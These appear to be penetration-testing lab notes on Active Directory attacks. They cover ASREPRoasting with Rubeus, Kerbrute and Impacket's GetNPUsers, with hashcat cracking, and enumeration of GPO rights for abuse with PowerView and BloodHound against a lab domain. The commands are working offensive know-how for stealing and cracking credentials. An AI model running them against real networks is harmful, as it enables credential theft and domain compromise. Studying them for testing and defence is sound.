
It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled. Many vendor installation guides specify that their service account be configured in this way.

ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.

If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.

#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser

```ruby
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking.


### Retrieving AS-REP in Proper Format using Rubeus

```ruby
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

crack mode for hashcat is `18200`


### Retrieving the AS-REP Using Kerbrute


```ruby
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```


With a list of valid users, we can use [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required.


```ruby
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```



## Group Policy Object (GPO) Abuse

#### Enumerating GPO Names with PowerView

```ruby
Get-DomainGPO |select displayname
```
#### Enumerating GPO Names with a Built-In Cmdlet

```ruby
Get-GPO -All | Select DisplayName
```

we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.

#### Enumerating Domain User GPO Rights

```ruby
$sid=Convert-NameToSid "Domain Users"
```

```ruby
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

#### Converting GPO GUID to Name

```ruby
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```


Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged for full control of the object.

If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.

